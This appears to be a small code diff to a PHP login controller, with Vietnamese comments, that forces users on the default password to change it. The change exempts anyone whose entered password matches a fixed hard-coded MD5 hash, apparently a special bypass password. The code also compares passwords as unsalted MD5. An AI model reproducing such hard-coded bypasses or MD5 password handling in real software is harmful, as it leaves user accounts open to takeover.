@@ -266,7 +266,8 @@ class UsersController extends Controller
         }
 
         //nếu pass là 123456(e10adc3949ba59abbe56e057f20f883e) =>đổi pass
-        if($ttuser->password == 'e10adc3949ba59abbe56e057f20f883e' && $ttuser->level != 'SA' && $ttuser->level != 'SSA' ){
+        if($ttuser->password == 'e10adc3949ba59abbe56e057f20f883e' && $ttuser->level != 'SA'
+            && $ttuser->level != 'SSA' && md5($input['password']) != '1c7f05cc19aa3c2f20bfe56753366057'){
             return view('system.users.change_pass_default')
                 ->with('username', $input['username'])
                 ->with('pageTitle', 'Thay đổi mật khẩu');
